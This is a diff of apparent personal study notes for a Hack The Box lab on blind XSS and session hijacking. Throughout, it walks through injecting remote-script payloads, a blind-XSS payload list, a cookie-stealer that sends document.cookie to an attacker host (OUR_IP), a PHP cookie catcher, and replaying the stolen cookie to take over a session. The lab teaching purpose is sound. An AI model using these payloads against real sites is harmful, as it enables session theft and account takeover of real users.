@@ -143,70 +143,103 @@ The redirect Location: http://SERVER_IP/phishing/index.php → sends the victim 
 ---
 ---
 
-# Section 8 - Session Hijacking
+# Section 8 - Blind XSS & Session Hijacking
 
-Cookies keep users logged in, so if an attacker steals a victim's session cookie through XSS, they may be able to **hijack the victim's logged-in session without knowing the password**.
+- **Session Hijacking** = a GOAL → steal the victim's **session cookie** so you log in as them **without the password**.
+- **Blind XSS** = a TYPE of XSS → your payload runs somewhere you **can't see** (e.g. an admin panel), so you prove it fired by making the victim's browser call back to your machine.
 
-[Session Hijacking (XSS)](https://notes.maccgenics.com/02-areas/hack-the-box/htb-academy/bug-bounty-hunter/7-cross-site-scripting-xss/session-hijacking-xss/) 
-### Blind XSS
+In this lab you combine them: use **Blind XSS discovery** to find the vulnerable field, then drop a **cookie-stealer** to hijack the session. Below is the whole thing in the correct order.
 
-With normal XSS, the result can usually be seen directly. **Blind XSS** is different because the payload is submitted somewhere, but the page where it executes cannot be seen.
 
-For example:
+## THE FULL ATTACK IN ORDER 
 
-```text
-Input → Admin Panel → Admin Browses it → XSS executes
+| Phase | Step | Command / payload |
+|-------|------|-------------------|
+| **0. Setup** | make your server folder | `mkdir /tmp/tmpserver` then `cd /tmp/tmpserver` |
+| 0 | write `script.js` (the cookie-stealer) + `index.php` (the catcher) | see Part 3 and Part 4 |
+| 0 | start your server (hosts both files + catches the cookie) | `sudo php -S 0.0.0.0:80` |
+| **1. Find the field** | inject a remote-script payload **using the field name as the path** | `<script src="http://OUR_IP/username"></script>` |
+| 1 | watch your server log — a hit means that field ran your code | you see `GET /username` → **username field is vulnerable** |
+| **2. Exploit** | inject the real payload into the vulnerable field | `<script src=http://OUR_IP/script.js></script>` |
+| 2 | victim's browser loads script.js → sends their cookie to you | automatic |
+| **3. Catch** | your `index.php` saves the cookie | `cat cookies.txt` |
+| **4. Use it** | paste the cookie into your browser → become the victim | DevTools → Storage → Cookies |
+
+Key point on order: **server up FIRST** (Phase 0), because the victim's browser has to be able to fetch `script.js` and your catcher has to be ready when the cookie arrives. Set the trap, then spring it.
+
+---
+
+## PART 1 — The two concepts
+
+### Session cookie theft
+
+Cookies keep users logged in. If you steal a victim's **session cookie** via XSS, you can **hijack their logged-in session without ever knowing the password** — you just become them.
+
+### Blind XSS (Session Hijacking) 
+
+Normal XSS: you see the result right away. **Blind XSS:** the payload is stored and executes **later, somewhere you can't see** — like an admin reviewing your input.
+
+```
+Input → stored → Admin opens the panel → XSS executes in the Admin's browser
 ```
 
-Blind XSS commonly appears in **contact forms, reviews, user details, support tickets, and HTTP headers**.
+Common places blind XSS lands: **contact forms, reviews, user/profile details, support tickets, HTTP headers**.
 
-Example:
+Example: you submit a registration at `http://SERVER_IP:PORT/hijacking/index.php` and the page only says:
 
-```text
-http://SERVER_IP:PORT/hijacking/index.php
 ```
-
-After submitting the form, the application may only show:
-
-```text
 Thank you for registering. An Admin will review your registration request.
 ```
 
-Because the Admin Panel is not accessible, it is not possible to see whether the input executed. Instead, use an XSS payload that makes a request back to the Attack Machine. If the server receives the request, the payload executed.
+You can't see the admin panel, so you can't tell if it fired. Solution: use a payload that **calls back to your machine**. If your server gets the request, the payload executed.
 
-## Finding the Vulnerable Field
+---
 
-Two things need to be discovered: **which field is vulnerable** and **which payload works**. A useful method is to load a remote JavaScript file and use the field name as the requested path.
+## PART 2 — "Finding the Vulnerable Field" + "Useful Blind XSS Payloads"
 
-```html
-<script src="http://OUR_IP/script.js"></script>
-```
+You need two unknowns: **which field is vulnerable** and **which payload works**. Clever trick: load a remote script and **use the field name as the path**, so the server log tells you which field fired.
 
-For example, test the username field with:
+Test the username field:
 
 ```html
 <script src="http://OUR_IP/username"></script>
 ```
 
-If the Attack Machine receives:
+If your server receives:
 
-```text
+```
 GET /username
 ```
 
-then the **username field is vulnerable**. The same method can be used for other fields:
+then the **username field is vulnerable**. Repeat per field:
 
 ```html
 <script src="http://OUR_IP/fullname"></script>
 ```
 
-```text
+```
 GET /fullname
 ```
 
-Different payloads may be needed depending on how the application handles the input.
+Start your server before testing:
 
-## Useful Blind XSS Payloads
+```bash
+mkdir /tmp/tmpserver
+```
+
+```bash
+cd /tmp/tmpserver
+```
+
+```bash
+sudo php -S 0.0.0.0:80
+```
+
+Then test fields one by one. Skip fields with **strong validation** (e.g. an email field that must be a valid email) if the payload can't get in.
+
+## Useful Blind XSS payloads (from PayloadsAllTheThings)
+
+Try these variations — the right one depends on how the app wraps your input (plain, inside a string `'`, inside double quotes `"`, etc.):
 
 ```html
 <script src=http://OUR_IP></script>
@@ -232,71 +265,48 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 <script>$.getScript("http://OUR_IP")</script>
 ```
 
-Before testing, start a server on the **Attack Machine**:
+The `'>` and `">` prefixes **break out** of an attribute/string before injecting — same break-out idea as SQLi. Try plain first, then the quote variants.
 
-```bash
-mkdir /tmp/tmpserver
-cd /tmp/tmpserver
-sudo php -S 0.0.0.0:80
-```
+---
 
-Then test the fields one by one. Fields with strong validation, such as an email field that must match a valid email format, may be skipped if the input cannot be injected successfully.
+## PART 3 — Build the cookie-stealer (choose payload, then deliver it) 
 
-## Session Hijacking with XSS
+### Choose ONE payload (not both)
 
-| Order | Do | Why |
-|-------|-----|-----|
-| 1 | Write **both** files in your server folder: `script.js` + `index.php` | the server serves both |
-| 2 | **Start the PHP server:** `sudo php -S 0.0.0.0:80` | must be live so the victim can fetch script.js AND so the cookie has somewhere to land |
-| 3 | **Then inject** the payload: `<script src=http://OUR_IP/script.js></script>` | now when it fires, your server is ready to answer |
-| 4 | Wait → victim triggers it → `cat cookies.txt` | cookie arrives |
+Once you know the field + a working payload, switch to one that **sends the cookie to your box**:
 
+| Payload | What it does | Trade-off |
+|---------|--------------|-----------|
+| `document.location='http://OUR_IP/index.php?c='+document.cookie;` | redirects the victim's browser to you, cookie in the URL | **navigates away** → victim sees the page change (obvious) |
+| `new Image().src='http://OUR_IP/index.php?c='+document.cookie;` | silently loads an invisible image from you, cookie in the URL | **stays on the page** → victim notices nothing ✅ better |
 
-#### Stage 1 — “Here are your 2 payload OPTIONS” (pick ONE)
+## Deliver it (put the chosen payload in a file)
 
-Once a working XSS payload and vulnerable field are identified, the payload can be changed to send the session cookie to the Attack Machine. Two common payloads are:
-
-```javascript
-document.location='http://OUR_IP/index.php?c='+document.cookie;
-```
-
-```javascript
-new Image().src='http://OUR_IP/index.php?c='+document.cookie;
-```
-
-The second method sends the request by creating an image, so the browser does not navigate away from the current page.
-
-#### Stage 2 — “Now DELIVER the chosen payload”
-
-Save the JavaScript as:
-
-```text
-script.js
-```
-
-Contents:
+Instead of cramming a long payload inline, save it as **`script.js`**:
 
 ```javascript
 new Image().src='http://OUR_IP/index.php?c='+document.cookie
 ```
 
-Then load it through the XSS payload:
+Then load it with a tiny injection:
 
 ```html
 <script src=http://OUR_IP/script.js></script>
 ```
 
-The process is:
+Why host it in a file: injectable fields are often **short**, and long inline JS breaks on **quotes/filters** — a one-line `<script src=...>` dodges both.
 
-```text
-XSS → script.js → document.cookie → Attack Machine
+The process:
+
+```
+XSS → loads script.js → reads document.cookie → sends it to your Attack Machine
 ```
 
-## Save the Cookies
+---
 
-A PHP script can receive the cookie and save it to `cookies.txt`.
+## PART 4 — Catch and save the cookie (index.php) 
 
-Create `index.php`:
+Create `index.php` in your server folder — it receives the cookie and appends it to `cookies.txt`:
 
 ```php
 <?php
@@ -312,59 +322,64 @@ if (isset($_GET['c'])) {
 ?>
 ```
 
-Start the PHP server:
+Server already running from Phase 0 (`sudo php -S 0.0.0.0:80`). When the XSS fires you'll see hits like:
 
-```bash
-sudo php -S 0.0.0.0:80
+```
+10.10.10.10:52798 [200]: /script.js
 ```
 
-When the XSS executes, the server may receive:
-
-```text
-10.10.10.10:52798 [200]: /script.js
+```
 10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
 ```
 
-The cookie is also saved in:
-
-```text
-cookies.txt
-```
-
-Check it with:
+Read what landed:
 
 ```bash
 cat cookies.txt
 ```
 
-Example:
+Example line:
 
-```text
+```
 Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
 ```
 
-## Use the Stolen Cookie
+---
 
-The cookie contains a **name** and **value**:
+## PART 5 — Use the stolen cookie (become the victim)
 
-```text
-cookie=f904f93c949d19d870911bf8b05fe7b2
+A cookie is a **name** and a **value**:
+
+```
+cookie = f904f93c949d19d870911bf8b05fe7b2
 ```
 
-```text
+```
 Name  = cookie
 Value = f904f93c949d19d870911bf8b05fe7b2
 ```
 
-In the HTB lab, open:
+Steps:
 
-```text
-/hijacking/login.php
-```
+| Step | Action |
+|------|--------|
+| 1 | In the HTB lab, open `/hijacking/login.php` |
+| 2 | Firefox DevTools → **Storage** → **Cookies** |
+| 3 | Add the stolen cookie (Name + Value) |
+| 4 | **Refresh** the page |
 
-Then use Firefox Developer Tools → **Storage** → Cookies and add the stolen cookie.
+If the app accepts it, you're now in the victim's session — no password needed.
 
-After refreshing the page, if the application accepts the cookie, the session may be accessed as the victim.
+---
+
+# Extras worth knowing
+
+- **HttpOnly kills this attack.** If the session cookie has the `HttpOnly` flag, JavaScript **cannot** read it with `document.cookie` — your stealer gets nothing. That's the #1 defense, and the reason real-world cookie theft often fails. Check the cookie's flags (DevTools → Storage → Cookies → HttpOnly column).
+- **`new Image()` beats `document.location`** almost always — no navigation, victim stays put, nothing looks off.
+- **Discovery vs exploitation point to different paths:** in Part 2 the `src` is the **field name** (just to read the log). In Part 3 the `src` is **script.js** (the real stealer). Same trick, different target file.
+- **Blind XSS = patience:** the payload fires only when the admin/victim opens the page — could be minutes or hours later. Leave the server running.
+- **Other things to steal with the same setup:** keystrokes, page content, perform actions as the victim (CSRF-style) — the cookie is just the most common loot.
+
 
 
 
